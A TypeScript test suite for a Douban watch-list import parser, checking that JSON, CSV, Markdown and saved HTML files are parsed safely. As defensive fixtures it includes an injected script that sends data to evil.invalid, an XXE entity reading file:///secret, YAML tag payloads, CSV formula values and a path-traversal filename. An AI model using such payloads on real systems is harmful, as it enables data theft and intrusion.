import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { runInNewContext } from 'node:vm';
import test from 'node:test';
import { parseHTML } from 'linkedom/worker';
import { parseDoubanImportFiles, renderDoubanImportParserScript, DoubanImportError, DOUBAN_IMPORT_LIMITS } from './douban-import.ts';

const options = { profileId: 'synthetic-owner' };
const base = { title: '自己的电影', url: 'https://movie.douban.com/subject/1234567/', type: 'movie', state: '看过', myRating: 4,
  collectionDate: '2026-11-12', myComment: '只有本人保存的短评' };
const json = (items: unknown, name = 'my-export.json') => ({ name, text: JSON.stringify(items) });
function browserParse(files: unknown, settings: unknown = options) {
  const { document } = parseHTML('<!doctype html><html><body></body></html>');
  const context = { window: {}, document, TextEncoder, URL, input: JSON.stringify(files), settings: JSON.stringify(settings) };
  const source = renderDoubanImportParserScript().replace(/^<script>/, '').replace(/<\/script>$/, '');
  runInNewContext(source + ';window.result=window.JiashuDoubanImport.parse(JSON.parse(input),JSON.parse(settings));', context);
  return JSON.parse(JSON.stringify((context.window as unknown as { result: unknown }).result));
}
function invalid(operation: () => unknown, pattern?: RegExp) {
  assert.throws(operation, (error: unknown) => {
    assert.ok(error instanceof DoubanImportError);
    assert.equal(error.code, 'INVALID_DOUBAN_IMPORT');
    if (pattern) assert.match(error.message, pattern);
    return true;
  });
}

type ImportContractCase = {
  name: string;
  files: { name: string; input: unknown; repeatRows?: number }[];
  confirmCompleted?: boolean;
  expected?: { subjects: string[]; ratings?: number[]; skipped: number; duplicates: number };
  errorIncludes?: string;
};

void test('the rendered browser parser follows the shared native and web import contract', async context => {
  const fixture = JSON.parse(readFileSync(new URL('../ios/JiashuHealthProbe/Tests/DoubanImportContract.json', import.meta.url), 'utf8')) as {
    profileId: string; cases: ImportContractCase[];
  };
  for (const scenario of fixture.cases) await context.test(scenario.name, () => {
    const files = scenario.files.map(file => {
      if (file.repeatRows === undefined) return json(file.input, file.name);
      assert.ok(Array.isArray(file.input));
      return json(Array.from({ length: file.repeatRows }, () => file.input).flat(), file.name);
    });
    const settings = { profileId: fixture.profileId, confirmCompleted: scenario.confirmCompleted === true };
    if (scenario.errorIncludes) {
      assert.throws(() => browserParse(files, settings), { message: new RegExp(scenario.errorIncludes) });
      return;
    }
    const output = browserParse(files, settings) as ReturnType<typeof parseDoubanImportFiles>;
    assert.ok(scenario.expected);
    assert.deepEqual(output.items.map(item => item.subjectId), scenario.expected.subjects);
    assert.equal(output.skipped, scenario.expected.skipped);
    assert.equal(output.duplicates, scenario.expected.duplicates);
    assert.ok(output.items.every(item => item.source === 'import'));
    if (scenario.expected.ratings) assert.deepEqual(output.items.map(item => item.rating), scenario.expected.ratings);
  });
});

void test('JSON maps only completed personal fields across all four kinds and never uploads unrelated private metadata', () => {
  const rows = [base,
    { ...base, title: '自己的电视剧', url: 'https://movie.douban.com/subject/2345678/', type: 'series' },
    { ...base, title: '自己的书', url: 'https://book.douban.com/subject/3456789/', type: 'book', state: '读过' },
    { ...base, title: '自己的音乐', url: 'https://music.douban.com/subject/4567890/', type: 'music', state: '听过', unrelatedPrivateData: 'PRIVATE-DO-NOT-UPLOAD' }];
  const result = parseDoubanImportFiles([json(rows)], options);
  assert.deepEqual(result.items.map(item => item.kind), ['movie', 'series', 'book', 'music']);
  assert.ok(result.items.every(item => item.source === 'import' && item.rating === 4 && item.markedDate === '2026-11-12'));
  assert.equal(result.items[0].comment, base.myComment);
  assert.equal(result.sourceFiles, 1); assert.equal(result.skipped, 0);
  assert.doesNotMatch(JSON.stringify(result), /PRIVATE-DO-NOT-UPLOAD|unrelatedPrivateData/);
  assert.deepEqual(browserParse([json(rows)]), result);
});

void test('a missing completion state requires explicit confirmation but wish, doing and unknown states stay skipped', () => {
  const rows = [{ ...base, state: undefined }, { ...base, state: '想看' }, { ...base, state: '在看' }, { ...base, state: '未识别状态' }];
  const preview = parseDoubanImportFiles([json(rows)], options);
  assert.equal(preview.items.length, 0); assert.equal(preview.skipped, 4); assert.ok(preview.warnings.length);
  const confirmed = parseDoubanImportFiles([json(rows)], { ...options, confirmCompleted: true });
  assert.equal(confirmed.items.length, 1); assert.equal(confirmed.skipped, 3);
  assert.match(confirmed.warnings.join(' '), /确认/);
  const wrongDomain = parseDoubanImportFiles([json([{ ...base, type: 'book', url: 'https://book.douban.com/subject/1234567/', state: '看过' }])], { ...options, confirmCompleted: true });
  assert.equal(wrongDomain.items.length, 0);
});

void test('site scores cannot masquerade as personal stars and canonical templates distinguish their rating field', () => {
  const result = parseDoubanImportFiles([json([{ ...base, myRating: null, rating: 4, score: 8.8, datePublished: '2000-01-01', collectionDate: null }])], options);
  assert.equal(result.items[0].rating, null); assert.equal(result.items[0].markedDate, null);
  assert.equal(result.items[0].details?.doubanRating, 8.8); assert.deepEqual(result.items[0].details?.releaseDates, ['2000-01-01']);
  assert.match(result.warnings.join(' '), /站点评分/);
  const envelope = { format: 'jiashu-douban-import-v1', profileId: options.profileId, items: [{ ...base, myRating: undefined, rating: 5 }] };
  assert.equal(parseDoubanImportFiles([json(envelope)], options).items[0].rating, 5);
  for (const rating of [0, 6, 4.5, '8.8', '=1+4']) invalid(() => parseDoubanImportFiles([json([{ ...base, myRating: rating }])], options), /评分/);
});

void test('safe Obsidian Markdown compatibility reads personal state, date and body comment without evaluating YAML', () => {
  const markdown = [
    '---', 'doubanId: 1234567', 'title: "自己的电影：一"', 'type: 电影', 'score: 8.8', 'myRating: 4', 'state: 看过',
    'url: https://movie.douban.com/subject/1234567/', 'collectionDate: 2026-11-12', 'datePublished: 2020-01-01',
    'actor: [某位演员]', 'desc: |', '  这个摘要不作为个人短评导入。', '---', '', '![image](<{{image}}>)', '',
    'Comment:', '---', '自己的第一行短评', '第二行短评', '', '---', 'Menu:', '不是短评',
  ].join('\n');
  const result = parseDoubanImportFiles([{ name: '自己的电影.md', text: markdown }], options);
  assert.equal(result.items[0].title, '自己的电影：一');
  assert.equal(result.items[0].rating, 4); assert.equal(result.items[0].markedDate, '2026-11-12');
  assert.equal(result.items[0].coverUrl, null); assert.equal(result.items[0].comment, '自己的第一行短评\n第二行短评');
  assert.deepEqual(result.items[0].details?.cast, ['某位演员']); assert.equal(result.items[0].details?.summary, '这个摘要不作为个人短评导入。');
  assert.deepEqual(browserParse([{ name: '自己的电影.md', text: markdown }]), result);
  for (const value of ['!!js/function >', '&anchor secret', '*anchor']) {
    invalid(() => parseDoubanImportFiles([{ name: 'bad.md', text: '---\ntitle: ' + value + '\nurl: https://movie.douban.com/subject/1234567/\nstate: 看过\n---' }], options), /YAML/);
  }
  invalid(() => parseDoubanImportFiles([{ name: 'bad.md', text: '---\ntitle: 一\ntitle: 二\n---' }], options), /重复/);
});

void test('UTF-8 CSV handles BOM, quoted commas, escaped quotes and multiline comments as inert text', () => {
  const csv = '\uFEFFtitle,url,type,state,myRating,myCollectionDate,myComment\r\n'
    + '"自己的,电影",https://movie.douban.com/subject/1234567/,movie,看过,4,2026-11-12,"第一行\r\n第二行""引号"""\r\n';
  const result = parseDoubanImportFiles([{ name: 'mine.csv', text: csv }], options);
  assert.equal(result.items[0].title, '自己的,电影');
  assert.equal(result.items[0].comment, '第一行\r\n第二行"引号"');
  assert.deepEqual(browserParse([{ name: 'mine.csv', text: csv }]), result);
  const formula = parseDoubanImportFiles([{ name: 'literal.csv', text: 'title,url,state\n=1+1,https://movie.douban.com/subject/1234567/,看过' }], options);
  assert.equal(formula.items[0].title, '=1+1');
  for (const text of ['title,url,state\n"unclosed', 'title,url,state\n"x"oops,url,看过', 'title,title\nx,y', 'title,url,state\nx,url']) {
    invalid(() => parseDoubanImportFiles([{ name: 'bad.csv', text }], options), /CSV/);
  }
});

function savedPage(extra = '') {
  return '<!DOCTYPE html><html><head><title>本人看过的电影(8)</title><link rel="canonical" href="https://movie.douban.com/people/synthetic-owner/collect"></head><body>'
    + '<h1>本人看过的电影(8)</h1><div class="grid-view"><div class="item"><div class="info"><ul><li class="title"><a href="https://movie.douban.com/subject/1234567/"><em>本人私密电影</em></a></li>'
    + '<li><span class="rating4-t"></span><span class="date">2026-11-12</span></li><li class="comment">本人自己的短评</li></ul></div></div></div>'
    + extra + '</body></html>';
}
void test('saved private collection HTML is detached, never executes scripts, and exports only completed item fields', (context) => {
  let fetches = 0; context.mock.method(globalThis, 'fetch', async () => { fetches++; throw new Error('No network allowed'); });
  const text = savedPage('<script>fetch("https://evil.invalid/EXFILTRATE");globalThis.PRIVATE_EXECUTED=true;</script><input name="ck" value="PRIVATE-TOKEN-NOT-IMPORTED">'
    + '<img src="https://evil.invalid/img"><iframe src="https://evil.invalid/frame" srcdoc="&lt;img src=https://evil.invalid/nested&gt;"></iframe>'
    + '<link rel="stylesheet" href="https://evil.invalid/style.css"><style>body{background:url(https://evil.invalid/css)}</style>');
  const result = parseDoubanImportFiles([{ name: 'private.html', text, domain: 'screen' }], options);
  assert.equal(fetches, 0);
  assert.equal(result.items[0].title, '本人私密电影'); assert.equal(result.items[0].kind, 'screen');
  assert.equal(result.items[0].rating, 4); assert.equal(result.items[0].markedDate, '2026-11-12');
  assert.equal(result.items[0].source, 'import'); assert.match(result.warnings.join(' '), /一个收藏页面/);
  assert.doesNotMatch(JSON.stringify(result), /EXFILTRATE|PRIVATE-TOKEN|PRIVATE_EXECUTED/);
  assert.deepEqual(browserParse([{ name: 'private.html', text }]), result);
  assert.doesNotMatch(renderDoubanImportParserScript(), /new DOMParser|window\.DOMParser/);
  assert.match(renderDoubanImportParserScript(), /createElement\("template"\)/);
  invalid(() => parseDoubanImportFiles([{ name: 'other.html', text: text.replace('/people/synthetic-owner/', '/people/someone-else/') }], options), /来源主页/);
  invalid(() => parseDoubanImportFiles([{ name: 'wish.html', text: text.replaceAll('看过的电影', '想看的电影') }], { ...options, confirmCompleted: true }), /收藏列表/);
  invalid(() => parseDoubanImportFiles([{ name: 'verify.html', text: '<h1>安全验证</h1>' }], options), /验证/);
  invalid(() => parseDoubanImportFiles([{ name: 'bad.html', text: '<!DOCTYPE html [<!ENTITY x SYSTEM "file:///secret">]>' + text }], options), /文档声明/);
});

void test('credential fields and wrong-profile input fail locally without exposing their contents', () => {
  for (const field of ['cookie', 'password', 'Authorization', 'access_token', 'sessionToken', 'dbcl2']) {
    invalid(() => parseDoubanImportFiles([json([{ ...base, [field]: 'SECRET-CREDENTIAL' }])], options), /凭据/);
    invalid(() => parseDoubanImportFiles([{ name: 'bad.md', text: '---\n' + field + ': SECRET-CREDENTIAL\n---' }], options), /凭据/);
    invalid(() => parseDoubanImportFiles([{ name: 'bad.csv', text: 'title,url,state,' + field + '\nx,https://movie.douban.com/subject/1234567/,看过,SECRET-CREDENTIAL' }], options), /凭据/);
  }
  invalid(() => parseDoubanImportFiles([json([{ ...base, profileId: 'another-owner' }])], options), /主页/);
  invalid(() => parseDoubanImportFiles([json([base])], { profileId: 'https://evil.invalid/' }), /主页 ID/);
  invalid(() => parseDoubanImportFiles([json([{ ...base, url: 'https://evil.invalid/subject/1234567/' }])], options), /豆瓣/);
});

void test('identical duplicates merge but conflicting copies fail the entire preview rather than choosing one silently', () => {
  const files = [json([base]), json([base], 'copy.json')];
  const result = parseDoubanImportFiles(files, options);
  assert.equal(result.items.length, 1); assert.equal(result.duplicates, 1); assert.equal(result.sourceFiles, 2);
  invalid(() => parseDoubanImportFiles([json([base]), json([{ ...base, myRating: 5 }], 'different.json')], options), /不同内容/);
  invalid(() => parseDoubanImportFiles([json([base, { ...base, url: 'https://evil.invalid/' }])], options));
});

void test('preview size, row, filename and field bounds remain explicit before any write', () => {
  invalid(() => parseDoubanImportFiles([], options), /1–100/);
  invalid(() => parseDoubanImportFiles(Array.from({ length: 101 }, () => json([])), options), /1–100/);
  invalid(() => parseDoubanImportFiles([{ name: '../unsafe.json', text: '[]' }], options), /描述/);
  invalid(() => parseDoubanImportFiles([{ name: 'x.js', text: '[]' }], options), /只支持/);
  invalid(() => parseDoubanImportFiles([{ name: 'too-big.json', text: ' '.repeat(DOUBAN_IMPORT_LIMITS.bytes + 1) }], options), /8 MiB/);
  invalid(() => parseDoubanImportFiles([{ name: 'too-big.html', text: ' '.repeat(DOUBAN_IMPORT_LIMITS.htmlBytes + 1) }], options), /HTML 页面过大/);
  invalid(() => parseDoubanImportFiles([json(Array.from({ length: 501 }, () => base))], options), /500/);
  invalid(() => parseDoubanImportFiles([json([{ ...base, myComment: '字'.repeat(2001) }])], options), /短评/);
  invalid(() => parseDoubanImportFiles([json([{ ...base, collectionDate: '2026-02-30' }])], options), /有效日期/);
});

void test('explicit JSON details preserve normalized rich metadata independently of personal collection data', () => {
  const details = { summary: '作品摘要\n第二段', alternateTitles: ['原名', '原名'], year: 2020, genres: ['剧情'], countries: ['中国'], languages: ['普通话'],
    doubanRating: 9.1, ratingCount: 1234, imdbId: 'tt1234567', directors: ['导演甲'], writers: ['编剧乙'], cast: ['演员丙'], releaseDates: ['2020-01-01(中国大陆)'], duration: '112分钟' };
  const input = [{ ...base, details, director: '不采用的顶层旧字段', tags: ['不导入的个人标签'], unrelatedPrivateData: 'PRIVATE-DO-NOT-UPLOAD' }];
  const result = parseDoubanImportFiles([json(input)], options), item = result.items[0];
  assert.equal(item.rating, 4); assert.equal(item.markedDate, '2026-11-12'); assert.equal(item.comment, base.myComment);
  assert.deepEqual(item.details, { ...details, alternateTitles: ['原名'] });
  assert.doesNotMatch(JSON.stringify(item), /PRIVATE|tags|旧字段/);
  assert.deepEqual(browserParse([json(input)]), result);
  assert.equal(parseDoubanImportFiles([json([{ ...base, details: {} }])], options).items[0].details, undefined);
});

void test('explicit screen IMDb import fields retain title IDs without importing an IMDb score or changing personal data', () => {
  for (const key of ['imdbId', 'imdbID', 'IMDb']) {
    const files = [json([{ ...base, [key]: 'tt1234567', imdbRating: 9.3 }])];
    const result = parseDoubanImportFiles(files, options);
    assert.deepEqual(result.items[0].details, { imdbId: 'tt1234567' });
    assert.equal(result.items[0].rating, 4); assert.equal(result.items[0].comment, base.myComment);
    assert.deepEqual(browserParse(files), result);
  }
  for (const imdbId of ['tt123456', 'https://www.imdb.com/title/tt1234567/', 'nm1234567', 1234567]) {
    invalid(() => parseDoubanImportFiles([json([{ ...base, imdbId }])], options), /详情/);
  }
});

void test('plugin fields map by source domain and never confuse publication dates, site scores or artists with personal fields', () => {
  const book = { ...base, type: 'book', url: 'https://book.douban.com/subject/1234567/', state: '读过', myRating: null, collectionDate: null,
    author: '作者甲 / 作者乙', translator: ['译者丙'], publisher: '合成出版社', datePublished: '2001-09', isbn: '9780000000001', totalPage: '321', price: '39.00元', binding: '平装', series: '合成丛书', score: '0', desc: '内容简介' };
  const music = { ...base, type: 'music', url: 'https://music.douban.com/subject/2345678/', state: '听过', actor: 'AC/DC / 演唱者乙', publisher: '合成唱片公司', datePublished: '2002-02-02', albumType: '专辑', medium: 'CD', tracks: ['第一曲', '第二曲'] };
  const result = parseDoubanImportFiles([json([book, music])], options);
  assert.equal(result.items[0].rating, null); assert.equal(result.items[0].markedDate, null);
  assert.deepEqual(result.items[0].details, { summary: '内容简介', doubanRating: 0, authors: ['作者甲', '作者乙'], translators: ['译者丙'], publisher: '合成出版社', publicationDate: '2001-09', isbn: '9780000000001', pages: 321, price: '39.00元', binding: '平装', seriesTitle: '合成丛书' });
  assert.deepEqual(result.items[1].details, { artists: ['AC/DC', '演唱者乙'], label: '合成唱片公司', releaseDate: '2002-02-02', albumType: '专辑', medium: 'CD', tracks: ['第一曲', '第二曲'] });
  assert.deepEqual(browserParse([json([book, music])]), result);
  const csv = 'title,url,state,myRating,author,publisher,isbn,score,totalPage\n合成书籍,https://book.douban.com/subject/3456789/,读过,5,作者丁,合成出版社,9780000000002,8.8,200';
  const imported = parseDoubanImportFiles([{ name: 'books.csv', text: csv }], options);
  assert.equal(imported.items[0].rating, 5); assert.equal(imported.items[0].details?.doubanRating, 8.8); assert.equal(imported.items[0].details?.pages, 200);
  assert.deepEqual(browserParse([{ name: 'books.csv', text: csv }]), imported);
  const csvDetails = 'title,url,state,details\n合成书籍,https://book.douban.com/subject/3456789/,读过,"{""authors"":[""作者丁""],""publisher"":""合成出版社""}"';
  assert.deepEqual(parseDoubanImportFiles([{ name: 'details.csv', text: csvDetails }], options).items[0].details, { authors: ['作者丁'], publisher: '合成出版社' });
});

void test('saved completed HTML takes only explicit structured per-item metadata without interpreting combined intro text', () => {
  const text = savedPage().replace('<li class="comment">', '<li><a rel="v:directedBy">合成导演</a><a rel="v:starring">合成演员</a><span property="v:average">8.9</span><span property="v:votes">123</span><p property="v:summary">合成摘要</p></li><li class="comment">');
  const result = parseDoubanImportFiles([{ name: 'with-metadata.html', text }], options);
  assert.equal(result.items[0].rating, 4);
  assert.deepEqual(result.items[0].details, { directors: ['合成导演'], cast: ['合成演员'], doubanRating: 8.9, ratingCount: 123, summary: '合成摘要' });
  assert.deepEqual(browserParse([{ name: 'with-metadata.html', text }]), result);
  const book = text.replaceAll('movie.douban.com', 'book.douban.com').replaceAll('看过的电影', '读过的书').replace('<a rel="v:directedBy">合成导演</a>', '<span itemprop="author">合成作者</span><span itemprop="publisher">合成出版社</span><span itemprop="isbn">9780000000003</span>');
  assert.deepEqual(parseDoubanImportFiles([{ name: 'book.html', text: book }], options).items[0].details?.authors, ['合成作者']);
  const plain = savedPage().replace('<li class="comment">', '<li class="intro">不能猜测为作者 / 出版社 / 页数</li><li class="comment">');
  assert.equal(parseDoubanImportFiles([{ name: 'plain.html', text: plain }], options).items[0].details, undefined);
});

void test('unsupported, credential-bearing, malformed or oversized details reject the whole preview without partial output', () => {
  const invalidDetails: unknown[] = [{ tags: ['不支持'] }, { directors: '应为数组' }, { doubanRating: 10.1 }, { doubanRating: 8.88 }, { ratingCount: -1 },
    { pages: 0 }, { summary: '<script>PRIVATE</script>' }, { summary: 'bad\u0000PRIVATE' }, { summary: '字'.repeat(6000) }, { cookie: 'PRIVATE-COOKIE' }];
  for (const details of invalidDetails) {
    invalid(() => parseDoubanImportFiles([json([base, { ...base, url: 'https://movie.douban.com/subject/2345678/', details }])], options));
    assert.throws(() => browserParse([json([{ ...base, details }])]), (error: unknown) => Boolean(error && typeof error === 'object' && 'message' in error && !String(error.message).includes('PRIVATE')));
  }
  invalid(() => parseDoubanImportFiles([json([{ ...base, score: '=1+4' }])], options), /详情/);
  const duplicate = parseDoubanImportFiles([json([{ ...base, details: { directors: ['同一导演'] } }, { ...base, details: { directors: ['同一导演'] } }])], options);
  assert.equal(duplicate.duplicates, 1);
  invalid(() => parseDoubanImportFiles([json([{ ...base, details: { directors: ['导演甲'] } }, { ...base, details: { directors: ['导演乙'] } }])], options), /不同内容/);
});
